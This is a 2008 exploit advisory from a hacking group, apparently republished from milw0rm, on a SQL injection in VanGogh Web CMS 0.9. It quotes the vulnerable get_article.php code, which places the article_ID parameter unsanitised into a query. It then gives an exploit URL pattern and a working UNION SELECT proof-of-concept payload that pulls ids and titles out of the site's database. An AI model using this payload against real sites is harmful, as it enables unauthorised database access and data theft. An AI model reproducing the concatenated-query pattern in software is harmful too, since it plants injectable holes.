@@ -1,0 +1,63 @@
+===================================================================
+  VanGogh Web CMS (article_ID) Remote SQL Injection Vulnerability
+===================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE   : 1 July 2008
+SITE   : cwh.citec.us
+
+
+#####################################################
+ APPLICATION : VanGogh Web CMS
+ VERSION     : 0.9
+ VENDOR      : http://vangogh.holoclan.de/
+ DOWNLOAD    : http://downloads.sourceforge.net/vangogh/vangogh_0_9.zip
+#####################################################
+
+
+--- Remote SQL Injection ---
+
+-----------------------------------
+ Vulnerable File (get_article.php)
+-----------------------------------
+
+@Line
+
+   337:   $sql='SELECT text.content, article.lastchanged, parttypes.tag'
+   338:       .' FROM article,T_A,text,parttypes'
+   339:       .' WHERE article.ID=T_A.AID AND text.ID=T_A.TID AND parttypes.ID=T_A.parttype AND article.ID='.$article_ID;
+   340:
+   341:   $result=mysql_query($sql,$db) or die("$sql : Parse template  Query funktioniert ned");
+
+---------
+ Exploit
+---------
+
+[+] http://[Target]/[vangogh_path]/index.php?article_ID=[SQL Injection]&get_action=article&section=5
+
+
+------
+ POC
+------
+
+[+] http://[Target]/[vangogh_path]/index.php?article_ID=8/**/AND/**/1=2/**/UNION/**/SELECT/**/1,concat(id,0x3a,title),3/**/FROM/**/section&get_action=article&section=5
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-07-01]
